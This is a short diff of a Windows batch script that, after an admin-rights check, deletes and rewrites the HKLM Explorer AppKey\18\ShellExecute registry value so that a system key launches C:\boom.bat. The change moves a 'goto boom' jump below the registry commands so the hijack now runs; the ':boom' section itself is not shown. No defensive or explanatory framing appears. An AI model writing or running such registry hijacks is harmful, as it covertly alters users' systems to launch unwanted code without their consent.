@@ -16,9 +16,10 @@ if %errorLevel% == 0 (
 )
 
 :modify_registry
-goto boom
 REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute /t REG_SZ /d C:\boom.bat /f
+goto boom
+
 pause 1
 
 :boom
